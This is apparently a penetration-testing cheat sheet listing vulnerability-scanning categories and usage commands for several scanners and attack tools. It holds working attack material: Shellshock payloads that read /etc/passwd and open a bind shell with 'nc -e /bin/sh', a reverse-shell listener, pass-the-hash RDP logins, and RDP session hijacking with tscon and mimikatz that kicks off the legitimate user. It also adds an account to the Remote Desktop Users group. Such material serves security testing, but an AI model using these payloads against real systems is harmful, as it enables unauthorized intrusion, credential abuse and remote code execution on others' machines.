# Vulnerability

### Vulnerability scanning
Includes:
* Application 
* Configuration
* Network 
* operating system 
* Network port based
* Network services based
* Banner grabbing
* Databases and Framework Modules
* Common/default Passwords
* Hardening 
* Misconfigurations
* Directory Listing/Brute Forcing
* Web Server Version/Vulnerability Identification
* Method (GET, POST, PUT, DELETE, OPTIONS)
* WebDav
* TRACE / TRACK
* VPN (Fingerprinting, Authentication)
* Voice Network Scanners
* Manual Direct Connections
* Obfuscated (Multiple Exit Nodes, IDS Evasion)
* Metadata Analysis
* Traffic Monitoring
* Citrix (Enumeration)
* DNS
* WEB
* Mail
* Identifying potential avenues/vectors

# Some example of tools you can use

## Nettacker (multi-scan)
Start it with docker-compose
```
docker-compose up -d && docker exec -it nettacker_nettacker_1 /bin/bash
```
Run your scan
```
python nettacker.py -i www.example.com -s -m port_scan
```
Access the result 
```
https://localhost:5000/
or
https://nettacker-api.z3r0d4y.com:5000/  (pointed to your localhost)
or
Default results path is .data/results
```

## Joomscan (joomla)
Do default checks
```
perl joomscan.pl -u www.example.com
```
Enumerate installed components
```
perl joomscan.pl -u www.example.com --ec
```

## Fuxploider (upload files)
Basic example
```
python3 fuxploider.py --url https://awesomeFileUploadService.com --not-regex "wrong file type"
```

## RDPChecker (Remote Desktop Protocol)
Test one host
```
python3 RDPChecker.py -d crazy.local -u Hypnoze -p S3cr3t 10.0.0.1
```
Test several hosts
```
python3 RDPChecker.py -d crazy.local -u Hypnoze -p S3cr3t 10.0.0.1,10.0.2.2,192.168.1.25,172.26.5.15
```
Test several hosts using file
``` 
python3 RDPChecker.py -d crazy.local -u Hypnoze -p S3cr3t hosts.txt
```
NMAP scritps
```
nmap -v --script rdp-enum-encryption -p 3389 -T4 IP
nmap -v --script rdp-vuln-ms12-020 -p 3389 -T4 IP
nmap -v --script rdp-ntlm-info -p 3389 -T4 IP
```
Connect with known creds
```
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp /u:[domain\]<username> /p:<password> /v:<IP>
xfreerdp /u:[domain\]<username> /pth:<hash> /v:<IP>
```
rdp_check.py from impacket let you check if some credentials are valid for a RDP service
```
rdp_check <domain>/<name>:<password>@<IP>
```
You can launch a new cmd to wich new credentials will be attached so, every interaction this new shell makes with the network will use the new credentials
```
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" 
#The password will be prompted
```
With Administrator rights you can access any opened RDP session by any user without need to know the password of the owner.
```
	# Get openned sessions:
	query use

	#Access to the selected session
	tscon <ID> /dest:<SESSIONNAME>

# Now you will be inside the selected RDP session and you will have impersonate a user using only Windows tools and features.

# Important: When you access an active RDP sessions you will kickoff the user that was using it.
```
  *You could get passwords from the process dumping it, but this method is much faster and led you interact with the virtual desktops of the user (passwords in notepad without been saved in disk, other RDP sessions opened in other machines).*

You could also use mimikatz to do this
```
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
```
Sticky-keys & Utilman
* Combining this technique with stickykeys or utilman you will be able to access a administrative CMD and any RDP session anytime.

Adding User to RDP group
```
net localgroup "Remote Desktop Users" UserLoginName /add
```

## Tulpar
whois checker
```
python tulpar.py whois [website]
```
SQLi flaws
```
python tulpar.py sql [website]
```
fuzzing injection
```
python tulpar.py fuzzing [website]
```
XSS injection
```
python tulpar.py xss [website]
```

## Silver
Scan host
```
python3 silver.py 127.0.0.1
python3 silver.py 127.0.0.1/22
python3 silver.py 127.0.0.1,127.0.0.2,127.0.0.3
```
Use Shodan
```
python3 silver.py 127.0.0.1 --shodan
```
Scan top ~1000 ports
```
python3 silver.py 127.0.0.1 --quick
```
Scan specific ports
```
python3 silver.py 127.0.0.1 -p80,443
```
Scan hosts from a file
```
python3 silver.py -i /path/to/targets.txt
```
Save JSON output to a file (Default: result-<ip_here>.json)
```
python3 silver.py 127.0.0.1 -o my_target.json
```
Set max number of parallel nmap instances (Default: number_of_cores)
```
python3 silver.py -i /path/to/targets.txt -t 4
```
Choose packets to be sent per seconds (Default: 10000)
```
python3 silver.py 127.0.0.1 --rate 1000
```

## Shellshock with Shocker

Usage
```
./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
```

cat file (view file contents)
```
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
```

Shell Shock run bind shell
```
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80 
```

Shell Shock reverse Shell
```
nc -l -p 443
```
